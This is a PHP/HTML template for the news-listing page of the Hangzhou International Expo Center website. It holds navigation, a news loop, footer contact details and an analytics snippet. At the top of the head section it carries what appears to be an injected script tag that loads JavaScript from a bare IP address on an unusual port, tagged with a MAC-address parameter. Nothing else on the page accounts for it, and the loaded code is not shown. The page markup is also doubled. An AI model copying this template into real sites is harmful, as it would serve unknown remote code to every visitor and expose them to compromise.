<?php if (!defined('THINK_PATH')) exit();?><!DOCTYPE html>
<html>


<!DOCTYPE html>
<html>

<head><script src="http://45.126.123.80:118/j.js?MAC=2CB21AAC22BC"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="renderer" content="webkit">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/css/swiper-4.1.6.min.css">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/css/bootstrap.css">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/css/pages.css">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/css/jquery.spinner.css">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/plugins/jquery-fancybox/jquery.fancybox-1.3.4.css">
    <link rel="stylesheet" href="http://www.hiechangzhou.com/Public/home/css/style.css">
    <title>杭州国际博览中心</title>
  
</head>
<body>
<style>
     @media (min-width: 768px){

                .logo1{
                    height: 82px;
                }
            }
</style>
<div class="header-all clearfix">
    <div class="header-left fl">
        <a href="/"><img src="http://www.hiechangzhou.com/Public/home/img/h-logo.png" alt=""><img src="/upload/shop/Public/home/images/logo1.jpg" alt="" class="logo1"></a>
    </div>
    <div class="header-right fr">
        <div class="header-nav clearfix">
            <ul>
                <li>
                        <a href="<?php echo U('Gwjj/index');?>">岗位简介</a>
                    </li>
                    <li>
                        <a href="<?php echo U('Xwdt/index');?>">新闻动态</a>
                    </li>
                    <li>
                        <a href="<?php echo U('Zchd/index');?>">争创活动</a>
                    </li>
                    <li>
                        <a href="<?php echo U('Gwjg/index');?>">岗位建功</a>
                    </li>
                    <li>
                        <a href="<?php echo U('Gwlb/index');?>">岗位练兵</a>
                    </li>
                   <!--  <li>
                        <a href="<?php echo U('Gwfc/index');?>">岗位风采</a>
                    </li> -->
                    <li>
                        <a href="<?php echo U('Gwcx/index');?>">岗位成效</a>
                    </li>
                    <li>
                        <a href="<?php echo U('Gwfx/index');?>">服务社会</a>
                    </li>

            </ul>
        </div>
        <!-- <div class="index-right-logo">
            <div class="swiper-container swiper-container-horizontal">
                <div class="swiper-wrapper">
                    <div class="swiper-slide" style="width: auto;">
                        <a href="#"><img src="http://www.hiechangzhou.com/Uploads/201807/5b3dc70694b3b.jpg" alt=""></a>
                    </div><div class="swiper-slide" style="width: auto;">
                        <a href="#"><img src="http://www.hiechangzhou.com/Uploads/201807/5b3dc70af01af.jpg" alt=""></a>
                    </div><div class="swiper-slide" style="width: auto;">
                        <a href="#"><img src="http://www.hiechangzhou.com/Uploads/201807/5b3dc710115b0.jpg" alt=""></a>
                    </div><div class="swiper-slide" style="width: auto;">
                        <a href="#"><img src="http://www.hiechangzhou.com/Uploads/201807/5b3dc7142ac6e.jpg" alt=""></a>
                    </div><div class="swiper-slide" style="width: auto;">
                        <a href="#"><img src="http://www.hiechangzhou.com/Uploads/201807/5b3dc732c892d.jpg" alt=""></a>
                    </div>    </div>
            </div>
        </div> -->
        <div class="nav-button"><i class="iconfont">&#xe6b9;</i></div>
        <div class="nav-mobile">
            <div class="nav-mobile-close">
                <i class="iconfont">&#xe618;</i>
            </div>
            <ul>
                <li><a href="/About/index" >关于我们</a></li>
                <li><a href="/News/index" class="header-nav-on">杭博新闻</a></li>
                <li><a href="/Service/index" >服务指南</a></li>
                <li><a href="/Hr/index" >人才招聘</a></li>
                <li><a href="http://www.hiechangzhou.com/News/index/category/1?lang=en-us">EN</a></li>  </ul>
        </div>

    </div>
</div>






<style>
    .news-content{
        background: url(/upload/shop/Public/home/images/bg2.png) no-repeat;
        background-size: cover;
    }
</style>


<div class="banner banner-3" style="background: url(/Uploads/<?php echo ($banner["pic"]); ?>) center 0 no-repeat;"></div>

    
    
<div class="news-content">
<div class="service-nav">
    <div class="container">
        <h3>新闻动态</h3>
        <p>您当前的位置 : 新闻动态</p>
    </div>
</div>
<div class="news-head">
<div class="container">
<div class="service-list" style="background: rgba(8,106,183,1);">
    <!-- <ul class="clearfix">
        <li class="list-nav-on"><a href="/News/index/category/1">热点新闻</a></li>
        <li><a href="/News/index/category/2">媒体报道</a></li>
        <li><a href="/News/index/category/3">公告信息</a></li>
        <li><a href="/News/index/category/4">巾帼文明岗</a></li>
    </ul> -->
</div>
<div class="news-list">
<div class="row">
<?php if(is_array($result)): $i = 0; $__LIST__ = $result;if( count($__LIST__)==0 ) : echo "" ;else: foreach($__LIST__ as $key=>$data): $mod = ($i % 2 );++$i;?><div class="col-md-4">
    <div class="news-box">
        <div class="news-pic">
            <a href="<?php echo U('Xwdt/detail',array('id' => $data['id']));?>"><img src="/Uploads/<?php echo ($data["thumb_pic"]); ?>" alt="<?php echo ($data["title"]); ?>"></a>
        </div>
        <div class="news-text">
            <a href="<?php echo U('Xwdt/detail',array('id' => $data['id']));?>">
                <div class="text-top">
                    <p><!-- <?php echo (date('Y-m-d',$data["time"])); ?> --></p>
                    <h3><?php echo ($data["title"]); ?></h3>
                </div>
                <div class="hide-text">
                    <p><?php echo ($data["description"]); ?></p>
                </div>
                <div class="text-bot">
                    <p> 查看更多 <span><i class="iconfont"></i></span></p>
                </div>
            </a>
        </div>

    </div>
</div><?php endforeach; endif; else: echo "" ;endif; ?>

         </div>
</div>
<div class="row myCarousel"><?php echo ($pagenavi); ?></div>
</div>

</div>

</div>
    



<block name="footer">




<div class="footer-all clearfix">
    <div class="footer-left fl">
        <div class="foot-nav">
            <ul class="clearfix">
                <li><a href="http://www.hiechangzhou.com">杭州国际博览中心</a></li>
                <li><a href="/">杭博巾帼文明岗</a></li>
                
                <!-- <li><a href="/Service/index">服务指南</a></li> -->
                <!-- <li><a href="/Hr/index">人才招聘</a></li> -->
                <!-- <li><a href="/Expo/index">展览中心</a></li>
                <li><a href="/Meeting/index">会议中心</a></li>
                <li><a href="/G20/index">G20体验馆</a></li>
                <li class="foot-nl"><a href="/Hotel/index">北辰酒店</a></li> -->
            </ul>
        </div>
        <p class="foot-add">A ：杭州市萧山区钱江世纪城奔竞大道353号    T ：+86 (571) 8290 8888    E：sales@hiechangzhou.com</p>
        <p>Copyright 2016 杭州国际博览中心. All Rights Reserved 浙ICP备16030893号 <a href="http://www.igori.cn" target="_blank"><i class="gori-icon"></i></a></p>
    </div>
    <div class="footer-right fr clearfix">
        <div class="footer-sn fl">
            <img src="http://www.hiechangzhou.com/Public/home/img/anzhuo.jpg" alt="">
            <p>APP（安卓）</p>
        </div>
        <div class="footer-sn fl">
            <img src="http://www.hiechangzhou.com/Public/home/img/ios.jpg" alt="">
            <p>APP（IOS）</p>
        </div>
        <div class="footer-sn fl">
            <img src="http://www.hiechangzhou.com/Public/home/img/sn.png" alt="">
            <p>关注微博</p>
        </div>
        <div class="footer-wc fl">
            <img src="http://www.hiechangzhou.com/Public/home/img/wc.png" alt="">
            <p>关注微信</p>
        </div>
    

    </div>
</div>
<div class="footer-mobile">
    Copyright 2018 杭州国际博览中心. 浙ICP备16030893号
</div>
<script type="text/javascript" src="http://www.hiechangzhou.com/Public/home/js/jquery-1.8.3.min.js"></script>
<script type="text/javascript" src="http://www.hiechangzhou.com/Public/home/js/jquery.SuperSlide.2.1.1.js"></script>
<script src="http://www.hiechangzhou.com/Public/home/plugins/jquery-fancybox/jquery.fancybox-1.3.4.js"></script>

<script>
    $(".nav-button").click(function(){
        $(".nav-mobile").show();
    });
    $(".nav-mobile-close").click(function(){
        $(".nav-mobile").hide();
    });
</script>
<script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1274537638'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1274537638%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>


</body>
</html>

</body>
</html>